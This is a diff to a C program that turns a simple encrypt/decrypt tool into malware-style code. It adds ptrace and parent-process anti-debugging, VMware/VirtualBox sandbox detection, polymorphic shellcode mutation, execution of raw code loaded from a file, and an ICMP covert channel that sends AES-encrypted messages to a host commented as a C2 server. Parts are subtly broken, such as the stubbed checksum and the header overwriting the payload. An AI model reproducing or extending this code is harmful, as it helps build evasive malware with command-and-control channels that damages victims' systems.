@@ -3,6 +3,7 @@
 #include <string.h>
 #include <unistd.h>
 #include <arpa/inet.h>
+#include <netinet/ip_icmp.h>
 #include <openssl/aes.h>
 #include <openssl/rand.h>
 #include <sys/types.h>
@@ -10,13 +11,15 @@
 #include <sys/wait.h>
 #include <fcntl.h>
 #include <sys/stat.h>
+#include <time.h>
 
 #define AES_KEY "0123456789abcdef"
 #define SERVER_IP "127.0.0.1"
-#define SERVER_PORT 12345
+#define ICMP_PAYLOAD_SIZE 64
 
-// Anti-Debugging
+// Anti-Debugging Techniques
 void anti_debug() {
+    // Inline assembly for anti-debugging
     __asm__ __volatile__ (
         "xor %eax, %eax\n\t"
         "mov $0x1, %eax\n\t"
@@ -30,7 +33,12 @@ void anti_debug() {
         "int $0x80\n\t"
         "_end:\n\t"
     );
+
+    // Check parent process ID
     if (getppid() != 1) exit(1);
+
+    // Use ptrace to prevent debugging
+    if (ptrace(PTRACE_TRACEME, 0, 1, 0) == -1) exit(1);
 }
 
 // AES Encryption/Decryption
@@ -63,91 +71,180 @@ char* decrypt_string(const char* enc_str) {
     return dec_str;
 }
 
-// Task Execution with Control Flow Obfuscation
-void fn1(const char* tsk) {
-    unsigned char k[16] = AES_KEY;
-    unsigned char buf[64];
-    int state = 0;
+// Check if Running in a VM
+int check_vm() {
+    FILE *f = fopen("/sys/class/dmi/id/product_name", "r");
+    if (f) {
+        char line[256];
+        while (fgets(line, sizeof(line), f)) {
+            if (strstr(line, "VMware") || strstr(line, "VirtualBox")) {
+                fclose(f);
+                return 1;
+            }
+        }
+        fclose(f);
+    }
+    return 0;
+}
 
-    if (strcmp(tsk, "encrypt") == 0) {
-        state = 1;
-    } else if (strcmp(tsk, "decrypt") == 0) {
-        state = 2;
-    } else {
-        state = 3;
+// Send ICMP Ping
+void send_ping(const char *target_ip, const char *message) {
+    int sockfd;
+    struct sockaddr_in addr;
+    struct icmp icmp_hdr;
+    char buffer[ICMP_PAYLOAD_SIZE];
+
+    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
+    if (sockfd < 0) {
+        perror("Socket creation failed");
+        exit(EXIT_FAILURE);
     }
 
-    while (1) {
-        switch (state) {
-            case 1:
-                {
-                    unsigned char pt[64] = "Sensitive data";
-                    unsigned char ct[64];
-                    aes_encrypt(pt, k, ct);
-                    printf("Encrypted: %s\n", ct);
-                    state = 4; // Move to a different state after this
-                    break;
-                }
-            case 2:
-                {
-                    unsigned char ct[64] = "EncryptedData";
-                    unsigned char pt[64];
-                    aes_decrypt(ct, k, pt);
-                    printf("Decrypted: %s\n", pt);
-                    state = 4; // Move to a different state after this
-                    break;
-                }
-            case 3:
-                {
-                    printf("Unknown task\n");
-                    state = 4; // Move to a different state after this
-                    break;
-                }
-            case 4:
-                {
-                    // Exit point, obfuscates the real exit
-                    return;
-                }
-            default:
-                state = 4; // Default to exit state
-                break;
-        }
+    memset(&addr, 0, sizeof(addr));
+    addr.sin_family = AF_INET;
+    inet_pton(AF_INET, target_ip, &addr.sin_addr);
+
+    memset(&icmp_hdr, 0, sizeof(icmp_hdr));
+    icmp_hdr.icmp_type = ICMP_ECHO;
+    icmp_hdr.icmp_code = 0;
+    icmp_hdr.icmp_id = getpid();
+    icmp_hdr.icmp_seq = 1;
+    icmp_hdr.icmp_cksum = 0;
+
+    memset(buffer, 0, sizeof(buffer));
+    strcpy(buffer, message);
+
+    memcpy(buffer, &icmp_hdr, sizeof(icmp_hdr));
+    icmp_hdr.icmp_cksum = 0; // Add your checksum function here
+    memcpy(buffer, &icmp_hdr, sizeof(icmp_hdr));
+
+    if (sendto(sockfd, buffer, sizeof(buffer), 0, (struct sockaddr*)&addr, sizeof(addr)) <= 0) {
+        perror("Sendto failed");
+        close(sockfd);
+        exit(EXIT_FAILURE);
+    }
+
+    close(sockfd);
+}
+
+// Receive ICMP Ping
+void receive_ping() {
+    int sockfd;
+    struct sockaddr_in addr;
+    char buffer[1024];
+    socklen_t addr_len;
+
+    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
+    if (sockfd < 0) {
+        perror("Socket creation failed");
+        exit(EXIT_FAILURE);
+    }
+
+    addr_len = sizeof(addr);
+    if (recvfrom(sockfd, buffer, sizeof(buffer), 0, (struct sockaddr*)&addr, &addr_len) <= 0) {
+        perror("Recvfrom failed");
+        close(sockfd);
+        exit(EXIT_FAILURE);
+    }
+
+    struct icmp *icmp_hdr = (struct icmp*)(buffer + sizeof(struct iphdr));
+    if (icmp_hdr->icmp_type == ICMP_ECHOREPLY) {
+        printf("Received ICMP ECHO REPLY: %s\n", buffer + sizeof(struct iphdr) + sizeof(struct icmp));
+    }
+
+    close(sockfd);
+}
+
+// Polymorphic Shellcode Mutation
+void mutate_shellcode(unsigned char* shellcode, size_t length) {
+    srand(time(NULL));
+    unsigned char key = rand() % 256;
+    for (size_t i = 0; i < length; i++) {
+        shellcode[i] = (shellcode[i] ^ key) << 1 | (shellcode[i] ^ key) >> 7;
     }
 }
 
-// Server Communication
-void comm_srv(const char* msg) {
-    int s;
-    struct sockaddr_in addr;
-    char buf[1024];
-    int br;
+// Dynamic Code Loading Example
+void load_and_execute_code() {
+    // Example: Load code from a file and execute it
+    FILE *f = fopen("code.bin", "rb");
+    if (!f) return;
 
-    s = socket(AF_INET, SOCK_STREAM, 0);
-    addr.sin_family = AF_INET;
-    addr.sin_port = htons(SERVER_PORT);
-    inet_pton(AF_INET, SERVER_IP, &addr.sin_addr);
+    fseek(f, 0, SEEK_END);
+    long size = ftell(f);
+    fseek(f, 0, SEEK_SET);
 
-    if (connect(s, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
-        printf("Connection failed\n");
+    unsigned char *code = malloc(size);
+    fread(code, 1, size, f);
+    fclose(f);
+
+    void (*func)() = (void (*)())code;
+    func();
+
+    free(code);
+}
+
+// Task Execution with Control Flow Obfuscation
+void execute_task(const char* task) {
+    unsigned char key[16] = AES_KEY;
+    unsigned char buffer[64];
+    
+    if (strcmp(task, "encrypt") == 0) {
+        goto encrypt_label;
+    } else if (strcmp(task, "decrypt") == 0) {
+        goto decrypt_label;
+    } else {
+        goto unknown_task_label;
+    }
+
+encrypt_label:
+    {
+        unsigned char plaintext[64] = "Sensitive data";
+        unsigned char ciphertext[64];
+        aes_encrypt(plaintext, key, ciphertext);
+        printf("Encrypted: %s\n", ciphertext);
         return;
     }
 
-    write(s, msg, strlen(msg));
-    br = read(s, buf, sizeof(buf) - 1);
-    if (br > 0) {
-        buf[br] = '\0';
-        printf("Received: %s\n", buf);
+decrypt_label:
+    {
+        unsigned char ciphertext[64] = "EncryptedData";
+        unsigned char plaintext[64];
+        aes_decrypt(ciphertext, key, plaintext);
+        printf("Decrypted: %s\n", plaintext);
+        return;
     }
 
-    close(s);
+unknown_task_label:
+    {
+        printf("Unknown task\n");
+        return;
+    }
 }
 
 int main(int argc, char *argv[]) {
     anti_debug();
+    
+    if (check_vm()) {
+        printf("Running in a VM. Exiting.\n");
+        exit(1);
+    }
 
     if (argc > 1) {
-        fn1(argv[1]);
-        comm_srv(argv[1]);
+        execute_task(argv[1]);
+
+        unsigned char shellcode[] = "\x31\xc0\xb0\x01\x31\xdb\xcd\x80";  // Example shellcode
+        mutate_shellcode(shellcode, sizeof(shellcode) - 1);
+        printf("Mutated Shellcode: ");
+        for (size_t i = 0; i < sizeof(shellcode) - 1; i++) {
+            printf("\\x%02x", shellcode[i]);
+        }
+        printf("\n");
+
+        char encrypted_message[ICMP_PAYLOAD_SIZE];
+        aes_encrypt((unsigned char*)argv[1], (unsigned char*)AES_KEY, (unsigned char*)encrypted_message);
+        send_ping(SERVER_IP, encrypted_message);  // Replace with C2 server IP
+        receive_ping();
     } else {
         printf("No task provided\n");
     }
